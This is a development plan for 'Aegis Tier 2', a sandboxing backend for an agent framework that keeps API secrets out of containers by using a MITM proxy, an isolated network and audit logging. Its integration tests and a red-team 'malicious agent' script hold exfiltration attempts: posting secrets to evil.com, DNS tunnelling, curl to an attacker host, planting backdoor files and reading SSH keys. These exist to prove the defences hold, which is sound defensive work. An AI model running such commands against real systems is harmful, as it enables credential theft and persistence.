# Tier 2 Plan — Aegis as Hermes Environment Backend

**Goal**: Aegis Tier 2 wraps Hermes's existing Docker backend, adding proxy-based secret injection, outbound content scanning, encrypted vault, and tamper-proof audit trail. Secrets never enter the container.

**Architecture**: Option C — `AegisEnvironment(BaseEnvironment)` that Hermes dispatches to natively via `TERMINAL_ENV=aegis`.

**Estimated effort**: 8-11 hours across 6 phases.

---

## What Already Exists

### From Hermes (don't rebuild)
- Docker container lifecycle (start, stop, exec, streaming, interrupts)
- Per-task environment pooling with idle cleanup
- Security hardening (cap-drop ALL, no-new-privileges, PID limits, tmpfs)
- Resource limits (CPU, memory, disk)
- Dangerous command approval system
- Secret redaction from logs
- File operations routed through environment backend

### From Aegis Tier 1 (already tested, 131 passing)
- Encrypted vault (Fernet + OS keyring)
- Secret pattern detection (API keys, tokens, credentials)
- Crypto key detection (ETH, BTC WIF, BIP32, Solana, BIP39 seed phrases)
- Encoding-aware scanning (base64, hex, URL-encoded, reversed)
- Audit trail with SHA-256 hash chain
- Outbound HTTP scanner (urllib3 monkey-patch)
- Middleware chain (allow/deny/needs-approval)

### From Aegis Tier 2 infrastructure (built, tested at config level)
- ArmorAddon for mitmproxy (key injection + content scanning)
- LLM provider matrix (OpenAI, Anthropic, Google, Groq, Together)
- ContentScanner (scans URL, body, headers)
- Container hardening config (read-only FS, resource limits)
- Proxy runner with async fix

---

## Phase 1: AegisEnvironment Backend (1-2 hours)

### Task 1.1 — Create AegisEnvironment

**New file**: `src/hermes_aegis/environment.py`

This is the core integration. Wraps Hermes's `DockerEnvironment` and adds the proxy sidecar.

```python
from tools.environments.base import BaseEnvironment
from tools.environments.docker import DockerEnvironment

class AegisEnvironment(BaseEnvironment):
    """Hermes execution backend with proxy-based secret isolation.

    Wraps DockerEnvironment. Starts MITM proxy before container,
    routes all container traffic through it. Secrets injected at
    HTTP layer — never in container env vars.
    """

    def __init__(self, image, cwd, timeout, env=None, **kwargs):
        super().__init__(cwd=cwd, timeout=timeout, env=env)

        # Strip secrets from env — they go in the vault, not the container
        clean_env = self._strip_secret_env_vars(env or {})

        # Add proxy routing to container env
        proxy_port = self._find_available_port()
        clean_env["HTTP_PROXY"] = f"http://host.docker.internal:{proxy_port}"
        clean_env["HTTPS_PROXY"] = f"http://host.docker.internal:{proxy_port}"
        clean_env["NO_PROXY"] = "localhost,127.0.0.1"
        clean_env["REQUESTS_CA_BUNDLE"] = "/certs/mitmproxy-ca-cert.pem"
        clean_env["SSL_CERT_FILE"] = "/certs/mitmproxy-ca-cert.pem"

        # Store secrets for proxy injection
        self._vault_secrets = self._extract_api_keys(env or {})
        self._proxy_port = proxy_port
        self._proxy_thread = None
        self._audit_trail = None

        # Create inner Docker environment with clean env
        self._inner = DockerEnvironment(
            image=image, cwd=cwd, timeout=timeout, env=clean_env, **kwargs
        )

    def execute(self, command, cwd="", *, timeout=None, stdin_data=None):
        # Start proxy on first execute (lazy init)
        if self._proxy_thread is None:
            self._start_proxy()
        return self._inner.execute(command, cwd, timeout=timeout, stdin_data=stdin_data)

    def cleanup(self):
        self._inner.cleanup()
        # Proxy thread is daemon — dies with process
```

**Key design decisions**:
- Lazy proxy start (first execute, not construction) — avoids port conflicts when environment is pooled but unused
- Secrets stripped from env dict before passing to DockerEnvironment
- CA cert mounted as read-only volume (no Dockerfile rebuild needed)
- Auto-port selection prevents conflicts

### Task 1.2 — Register as Hermes Backend

**How Hermes discovers backends** (from `terminal_tool.py` line 441):
```python
env_type = os.getenv("TERMINAL_ENV", "local")
```

**Registration approach**: Add `aegis` to the environment factory in Hermes config:
```yaml
# ~/.hermes/config.yaml
terminal:
  backend: aegis
```

**Or** via environment variable:
```bash
export TERMINAL_ENV=aegis
```

**Implementation**: Either monkey-patch the factory at import time, or provide a small installer script that symlinks the backend.

**Test**: Set `TERMINAL_ENV=aegis`, run `hermes chat -q "list files in /workspace"`. Verify command runs in container, no secrets in env.

### Task 1.3 — Port Auto-Selection

**File**: `src/hermes_aegis/proxy/runner.py`

```python
def find_available_port(start=8443, end=8500) -> int:
    """Find an available port for the proxy."""
    import socket
    for port in range(start, end):
        try:
            sock = socket.socket()
            sock.bind(('localhost', port))
            sock.close()
            return port
        except OSError:
            continue
    raise RuntimeError(f"No available port in range {start}-{end}")
```

### Task 1.4 — Proxy Health Check

**File**: `src/hermes_aegis/proxy/runner.py`

```python
def wait_for_proxy_ready(port: int, timeout: int = 5) -> bool:
    """Poll until proxy is listening."""
    import socket, time
    start = time.time()
    while time.time() - start < timeout:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            sock.connect(('localhost', port))
            sock.close()
            return True
        except OSError:
            time.sleep(0.1)
    return False
```

---

## Phase 2: Network Isolation (30 min)

### Task 2.1 — Internal Network

**File**: `src/hermes_aegis/container/builder.py`

The Docker network must be `internal: true`. This means containers on the network can reach each other and the host (via `host.docker.internal`), but have **zero direct internet access**. All outbound traffic must go through the proxy.

```python
def ensure_network(client) -> str:
    try:
        net = client.networks.get(ARMOR_NETWORK)
        # Verify it's internal
        if not net.attrs.get("Internal", False):
            net.remove()
            raise Exception("recreate")
    except Exception:
        client.networks.create(
            ARMOR_NETWORK,
            driver="bridge",
            internal=True,  # THIS IS THE KEY LINE — no internet access
            labels={"managed-by": "hermes-aegis"},
        )
    return ARMOR_NETWORK
```

**Why this matters**: With `internal: True`:
- HTTP/HTTPS through proxy: Works (container → host.docker.internal → proxy → internet)
- Direct TCP to attacker.com: Blocked (no route)
- DNS tunneling: Blocked (no DNS route to internet)
- ICMP tunneling: Blocked (no route)
- Raw sockets: Blocked (CAP_NET_RAW dropped AND no route)

This single flag closes the entire class of "bypass the proxy" attacks.

**Test**: From inside container, `python -c "import socket; socket.create_connection(('8.8.8.8', 53))"` should fail with `Network is unreachable`.

---

## Phase 3: CA Certificate Handling (1 hour)

### Task 3.1 — Generate and Mount CA Cert

**No Dockerfile rebuild needed.** Mount the cert as a read-only volume.

mitmproxy generates its CA cert at `~/.mitmproxy/mitmproxy-ca-cert.pem` on first run. If it doesn't exist yet, generate it:

```python
def ensure_mitmproxy_ca_cert() -> Path:
    """Ensure mitmproxy CA certificate exists."""
    cert_path = Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem"
    if cert_path.exists():
        return cert_path

    # Generate by starting and immediately stopping mitmproxy
    import subprocess
    proc = subprocess.Popen(
        ["mitmdump", "--set", "listen_port=0"],  # port 0 = OS picks
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    import time
    time.sleep(2)
    proc.terminate()
    proc.wait()

    if not cert_path.exists():
        raise RuntimeError("Failed to generate mitmproxy CA certificate")
    return cert_path
```

### Task 3.2 — Add Cert Volume to Container Config

**File**: `src/hermes_aegis/container/builder.py`

```python
def build_run_args(config: ContainerConfig) -> dict:
    cert_path = str(Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem")

    return {
        # ... existing config ...
        "volumes": {
            config.workspace_path: {"bind": "/workspace", "mode": "rw"},
            cert_path: {"bind": "/certs/mitmproxy-ca-cert.pem", "mode": "ro"},
        },
        "environment": {
            "HTTP_PROXY": proxy_url,
            "HTTPS_PROXY": proxy_url,
            "REQUESTS_CA_BUNDLE": "/certs/mitmproxy-ca-cert.pem",
            "SSL_CERT_FILE": "/certs/mitmproxy-ca-cert.pem",
            "NO_PROXY": "localhost,127.0.0.1",
            "HOME": "/home/hermes",
        },
        # ...
    }
```

**Why this works**: `REQUESTS_CA_BUNDLE` tells Python's `requests` and `urllib3` to trust this CA. `SSL_CERT_FILE` tells OpenSSL (used by most other Python HTTP libraries) the same. No need to run `update-ca-certificates` in the container.

**Test**: From container, `python -c "import requests; print(requests.get('https://example.com').status_code)"` should return 200 (routed through proxy, cert trusted).

---

## Phase 4: Crypto-Specific Pattern Improvements (1 hour)

### Task 4.1 — Expand BIP39 Wordlist

**File**: `src/hermes_aegis/patterns/crypto.py`

Current: 20 words. Needs: full 2048-word BIP39 list (or top 200 most common).

The 20-word sample catches seed phrases where 50%+ of words match those 20. That means a real 12-word phrase needs 6+ of its words to be in the sample. With only 20 of 2048 words, probability of catching a random phrase is very low.

**Fix**: Ship the full BIP39 English wordlist. It's 2048 words — about 15KB. Load it from a data file:

```python
# src/hermes_aegis/patterns/bip39_english.txt (one word per line, 2048 lines)
# Source: https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt

BIP39_WORDLIST: set[str] = set()

def _load_bip39():
    global BIP39_WORDLIST
    wordlist_path = Path(__file__).parent / "bip39_english.txt"
    if wordlist_path.exists():
        BIP39_WORDLIST = set(wordlist_path.read_text().strip().splitlines())
    else:
        BIP39_WORDLIST = BIP39_SAMPLE_WORDS  # fallback to current 20
```

Lower the match threshold from 50% to 40% — a 12-word phrase where 5+ words are BIP39 is almost certainly a seed phrase.

### Task 4.2 — Add RPC URL Pattern Detection

**File**: `src/hermes_aegis/patterns/secrets.py`

Detect API keys embedded in RPC/provider URLs:

```python
# Alchemy, Infura, QuickNode URLs with embedded keys
("rpc_url_with_key", re.compile(
    r"https?://(?:eth-mainnet\.g\.alchemy\.com/v2|mainnet\.infura\.io/v3|"
    r"[a-z-]+\.quiknode\.pro)/[A-Za-z0-9_-]{20,}"
)),
```

These are common in `.env` files and hardhat/foundry configs. A leaked Alchemy key means someone can use your RPC credits and potentially see your pending transactions.

### Task 4.3 — Add HD Derivation Path Logging

Not a secret, but useful for audit awareness:

```python
# HD derivation paths — signal crypto operations happening
("hd_derivation_path", re.compile(r"m/\d+['h]?/\d+['h]?/\d+['h]?(?:/\d+)*")),
```

Log these as `INFO` in the audit trail, not `BLOCKED`. Seeing `m/44'/60'/0'/0/0` in the audit means the agent was deriving wallet addresses — worth knowing during forensics.

---

## Phase 5: Integration Tests — Real Attacks (3-4 hours)

All tests require Docker. Skip cleanly with `@pytest.mark.skipif`.

### Task 5.1 — Exfiltration from Container (Blocked)

**File**: `tests/integration/test_tier2_exfiltration.py`

```python
@pytest.mark.skipif(not shutil.which("docker"), reason="Docker required")
class TestTier2Exfiltration:

    def test_env_var_secret_theft(self, aegis_container):
        """Attack: scan env vars for API keys and send them out."""
        script = '''
import os, json
# Realistic attack: enumerate env for anything valuable
secrets = {k: v for k, v in os.environ.items()
           if any(w in k.upper() for w in ['KEY', 'SECRET', 'TOKEN', 'PASSWORD'])}
print(json.dumps(secrets))
'''
        result = aegis_container.execute(f'python3 -c """{script}"""')
        output = json.loads(result["output"])

        # Container env should have ZERO secrets
        assert len(output) == 0, f"Secrets found in container env: {list(output.keys())}"

    def test_http_body_exfiltration(self, aegis_container, echo_server):
        """Attack: send secret in HTTP request body to attacker server."""
        script = f'''
import requests
try:
    requests.post("http://host.docker.internal:{echo_server.port}/exfil",
                  json={{"stolen": "sk-proj-test-secret-key-12345"}}, timeout=5)
    print("SENT")
except Exception as e:
    print(f"BLOCKED: {{e}}")
'''
        result = aegis_container.execute(f'python3 -c """{script}"""')
        assert "BLOCKED" in result["output"] or echo_server.request_count == 0

    def test_base64_encoded_exfiltration(self, aegis_container, echo_server):
        """Attack: base64-encode a secret before sending."""
        script = f'''
import requests, base64
secret = "sk-proj-test-secret-key-12345"
encoded = base64.b64encode(secret.encode()).decode()
try:
    requests.post("http://host.docker.internal:{echo_server.port}/exfil",
                  data=encoded, timeout=5)
    print("SENT")
except Exception as e:
    print(f"BLOCKED: {{e}}")
'''
        result = aegis_container.execute(f'python3 -c """{script}"""')
        assert "BLOCKED" in result["output"] or echo_server.request_count == 0

    def test_direct_tcp_bypass(self, aegis_container):
        """Attack: bypass proxy with direct TCP connection."""
        script = '''
import socket
try:
    s = socket.create_connection(("8.8.8.8", 53), timeout=3)
    s.close()
    print("CONNECTED")
except Exception as e:
    print(f"BLOCKED: {e}")
'''
        result = aegis_container.execute(f'python3 -c """{script}"""')
        assert "BLOCKED" in result["output"]

    def test_dns_tunneling(self, aegis_container):
        """Attack: encode data in DNS queries."""
        script = '''
import socket
try:
    socket.getaddrinfo("sk-proj-secret.evil.com", 80)
    print("RESOLVED")
except Exception as e:
    print(f"BLOCKED: {e}")
'''
        result = aegis_container.execute(f'python3 -c """{script}"""')
        assert "BLOCKED" in result["output"]

    def test_workspace_file_scan(self, aegis_container, echo_server):
        """Attack: scan workspace files for secrets, try to exfil."""
        script = f'''
import glob, requests
for f in glob.glob("/workspace/**/*", recursive=True):
    try:
        with open(f) as fh:
            content = fh.read()
            if "sk-" in content or "0x" in content:
                requests.post("http://host.docker.internal:{echo_server.port}/exfil",
                              data=content, timeout=5)
                print("SENT")
    except:
        pass
print("DONE")
'''
        result = aegis_container.execute(f'python3 -c """{script}"""')
        assert echo_server.request_count == 0, "Workspace secrets reached echo server"

    def test_filesystem_read_only(self, aegis_container):
        """Attack: try to write persistent backdoor outside workspace."""
        script = '''
import os
for path in ["/usr/local/bin/backdoor", "/etc/cron.d/exfil", "/home/hermes/.bashrc"]:
    try:
        with open(path, "w") as f:
            f.write("malicious")
        print(f"WROTE {path}")
    except Exception as e:
        print(f"BLOCKED {path}: {e}")
'''
        result = aegis_container.execute(f'python3 -c """{script}"""')
        assert "WROTE" not in result["output"]
```

### Task 5.2 — Key Injection Verification

**File**: `tests/integration/test_tier2_injection.py`

```python
@pytest.mark.skipif(not shutil.which("docker"), reason="Docker required")
class TestTier2KeyInjection:

    def test_openai_key_injected(self, aegis_container_with_vault, echo_server_as_openai):
        """Container calls OpenAI API without key. Proxy injects it."""
        script = f'''
import requests
# No API key in code or environment
r = requests.get("https://api.openai.com/v1/models", timeout=10)
print(f"STATUS: {{r.status_code}}")
'''
        result = aegis_container_with_vault.execute(f'python3 -c """{script}"""')

        # Verify echo server received the injected Authorization header
        assert echo_server_as_openai.last_request is not None
        auth = echo_server_as_openai.last_request.headers.get("Authorization", "")
        assert auth.startswith("Bearer sk-"), f"Expected Bearer token, got: {auth}"

    def test_anthropic_key_injected(self, aegis_container_with_vault, echo_server_as_anthropic):
        """Same test for Anthropic (uses x-api-key header, not Authorization)."""
        script = f'''
import requests
r = requests.post("https://api.anthropic.com/v1/messages",
                   json={{"model": "claude-3", "messages": []}}, timeout=10)
print(f"STATUS: {{r.status_code}}")
'''
        result = aegis_container_with_vault.execute(f'python3 -c """{script}"""')

        api_key = echo_server_as_anthropic.last_request.headers.get("x-api-key", "")
        assert api_key.startswith("sk-ant-"), f"Expected Anthropic key, got: {api_key}"

    def test_container_env_has_no_keys(self, aegis_container_with_vault):
        """Even with vault loaded, container env has zero API keys."""
        result = aegis_container_with_vault.execute("env")
        output = result["output"]

        for key_name in ["OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GOOGLE_API_KEY"]:
            assert key_name not in output, f"{key_name} found in container env!"

        # Also check no key values leaked
        assert "sk-proj" not in output
        assert "sk-ant" not in output
```

### Task 5.3 — Audit Trail Verification

**File**: `tests/integration/test_tier2_audit.py`

```python
@pytest.mark.skipif(not shutil.which("docker"), reason="Docker required")
class TestTier2Audit:

    def test_blocked_request_logged(self, aegis_container, audit_trail):
        """Blocked exfiltration attempt appears in audit trail."""
        # Run exfil attempt
        aegis_container.execute(
            'python3 -c "import requests; requests.post(\'http://evil.com\', data=\'sk-proj-abc123\')"'
        )

        entries = audit_trail.read_all()
        blocked = [e for e in entries if e.decision == "BLOCKED"]
        assert len(blocked) >= 1

        # Verify the raw secret is NOT in the audit log
        raw_log = audit_trail._path.read_text()
        assert "sk-proj-abc123" not in raw_log

    def test_injected_request_logged(self, aegis_container_with_vault, audit_trail):
        """Key injection appears in audit trail."""
        aegis_container_with_vault.execute(
            'python3 -c "import requests; requests.get(\'https://api.openai.com/v1/models\')"'
        )

        entries = audit_trail.read_all()
        # Should have at least one entry for the OpenAI request
        assert len(entries) >= 1

    def test_audit_chain_integrity_after_session(self, aegis_container, audit_trail):
        """After multiple operations, hash chain is intact."""
        # Run several commands to generate audit entries
        for i in range(5):
            aegis_container.execute(f"echo test-{i}")

        assert audit_trail.verify_chain()
```

---

## Phase 6: Vault Auto-Import & Graceful Degradation (1 hour)

### Task 6.1 — Import Secrets from Hermes Config

**File**: `src/hermes_aegis/vault/migrate.py` (extend)

During `hermes-aegis setup`, scan for existing API keys in:
1. `~/.hermes/config.yaml` (if keys are stored there)
2. Environment variables (OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.)
3. `~/.hermes/.env` (if it exists)

Offer to import into the encrypted vault:
```
Found 3 API keys in your environment:
  OPENAI_API_KEY (sk-proj-...789)
  ANTHROPIC_API_KEY (sk-ant-...456)
  ALCHEMY_API_KEY (abc...def)

Import these into encrypted vault? [Y/n]
```

### Task 6.2 — Graceful Fallback to Tier 1

If `TERMINAL_ENV=aegis` but Docker isn't available:

```python
class AegisEnvironment(BaseEnvironment):
    def __init__(self, ...):
        if not docker_available():
            logger.warning(
                "Docker not available — falling back to Tier 1 "
                "(in-process scanning only). Install Docker for full isolation."
            )
            # Fall back to local environment with Tier 1 scanner
            self._inner = LocalEnvironment(cwd=cwd, timeout=timeout, env=env)
            self._tier = 1
            install_tier1_scanner(vault)
        else:
            self._inner = DockerEnvironment(...)
            self._tier = 2
```

---

## Phase 7: Red Team & Polish (2-3 hours)

### Task 7.1 — Full Attack Simulation Script

**File**: `tests/red_team/malicious_agent.py`

A single script that tries every bypass technique. Run inside the Aegis container. Every attack should fail.

```python
"""Malicious agent simulation. Every line should fail in Aegis Tier 2."""

import os, sys, json, socket, subprocess, base64

results = {}

# 1. Read env vars for secrets
secrets = {k: v for k, v in os.environ.items()
           if any(w in k.upper() for w in ['KEY', 'SECRET', 'TOKEN', 'PASS', 'PRIVATE'])}
results["env_secrets"] = "FAIL" if secrets else "PROTECTED"

# 2. Read vault file
try:
    open(os.path.expanduser("~/.hermes-aegis/vault.enc")).read()
    results["vault_read"] = "FAIL"
except:
    results["vault_read"] = "PROTECTED"

# 3. HTTP exfiltration
try:
    import requests
    requests.post("http://evil.com/exfil", json={"test": "data"}, timeout=3)
    results["http_exfil"] = "FAIL"
except:
    results["http_exfil"] = "PROTECTED"

# 4. Direct TCP
try:
    s = socket.create_connection(("8.8.8.8", 53), timeout=3)
    s.close()
    results["direct_tcp"] = "FAIL"
except:
    results["direct_tcp"] = "PROTECTED"

# 5. DNS tunneling
try:
    socket.getaddrinfo("secret-data.evil.com", 80)
    results["dns_tunnel"] = "FAIL"
except:
    results["dns_tunnel"] = "PROTECTED"

# 6. Raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    results["raw_socket"] = "FAIL"
except:
    results["raw_socket"] = "PROTECTED"

# 7. Curl subprocess
try:
    subprocess.run(["curl", "evil.com"], check=True, capture_output=True, timeout=3)
    results["curl"] = "FAIL"
except:
    results["curl"] = "PROTECTED"

# 8. Write outside workspace
try:
    open("/usr/local/bin/backdoor", "w").write("pwned")
    results["fs_escape"] = "FAIL"
except:
    results["fs_escape"] = "PROTECTED"

# 9. Read host SSH keys (shouldn't be mounted)
try:
    open("/root/.ssh/id_rsa").read()
    results["ssh_read"] = "FAIL"
except:
    results["ssh_read"] = "PROTECTED"

# Report
print(json.dumps(results, indent=2))
failed = [k for k, v in results.items() if v == "FAIL"]
if failed:
    print(f"\n❌ FAILED: {', '.join(failed)}")
    sys.exit(1)
else:
    print(f"\n✅ ALL {len(results)} ATTACKS BLOCKED")
    sys.exit(0)
```

**Test wrapper**:
```python
def test_red_team_all_attacks_fail(aegis_container):
    result = aegis_container.execute("python3 /workspace/malicious_agent.py")
    assert result["returncode"] == 0
    assert "ALL" in result["output"] and "BLOCKED" in result["output"]
```

### Task 7.2 — Update Documentation

- Update README.md with Tier 2 usage (`TERMINAL_ENV=aegis`)
- Add attack vector comparison table (base Hermes vs T1 vs T2)
- Document limitations honestly:
  - Timing side channels: not defended
  - Covert channels via proxy response timing: not defended
  - If attacker has arbitrary code exec on HOST (not container): game over regardless
  - Tier 1 fallback when Docker unavailable: best-effort only

### Task 7.3 — Performance Benchmarks

Measure and document:
- Proxy startup time (target: <2s)
- Per-request proxy latency overhead (target: <10ms)
- Container startup time (target: <5s)
- Content scan time per request (target: <1ms)
- Memory overhead (proxy + container vs bare Docker)

---

## Dependency Order

```
Phase 1 (AegisEnvironment)
    ↓
Phase 2 (Network isolation) ←── can be done in parallel with Phase 3
    ↓
Phase 3 (CA cert handling)
    ↓
Phase 4 (Crypto patterns) ←── independent, can be done any time
    ↓
Phase 5 (Integration tests) ←── requires Phases 1-3 complete
    ↓
Phase 6 (Vault import + fallback) ←── independent
    ↓
Phase 7 (Red team + polish) ←── requires Phase 5 complete
```

**Parallelizable**: Phase 4 and Phase 6 can be done any time. Phases 2 and 3 can be done in parallel.

---

## Test Fixtures Needed

```python
# conftest.py for integration tests

@pytest.fixture
def aegis_container(tmp_path):
    """Start Aegis environment with proxy, yield, cleanup."""
    env = AegisEnvironment(
        image="python:3.11-slim",
        cwd=str(tmp_path / "workspace"),
        timeout=30,
    )
    yield env
    env.cleanup()

@pytest.fixture
def echo_server():
    """HTTP server that records all requests (for verifying what got through)."""
    server = EchoServer(port=0)  # OS picks port
    server.start()
    yield server
    server.shutdown()

@pytest.fixture
def audit_trail(tmp_path):
    """Fresh audit trail for testing."""
    return AuditTrail(tmp_path / "audit.jsonl")
```

---

## Definition of Done

- [ ] `TERMINAL_ENV=aegis` works in Hermes — commands run in container with proxy
- [ ] Container env has zero API keys (verified by test)
- [ ] Proxy injects keys for OpenAI, Anthropic (verified by test)
- [ ] HTTP exfiltration blocked (verified by test)
- [ ] Direct TCP blocked — `internal: true` network (verified by test)
- [ ] DNS tunneling blocked (verified by test)
- [ ] Read-only filesystem outside /workspace (verified by test)
- [ ] Full red team script: all 9 attacks fail
- [ ] BIP39 full wordlist for seed phrase detection
- [ ] RPC URL pattern detection (Alchemy, Infura, QuickNode)
- [ ] Audit trail logs all proxy decisions with hash chain integrity
- [ ] Graceful fallback to Tier 1 when Docker unavailable
- [ ] Performance benchmarks documented
- [ ] README updated with honest capabilities and limitations
- [ ] Zero test failures in `uv run pytest tests/ -v`
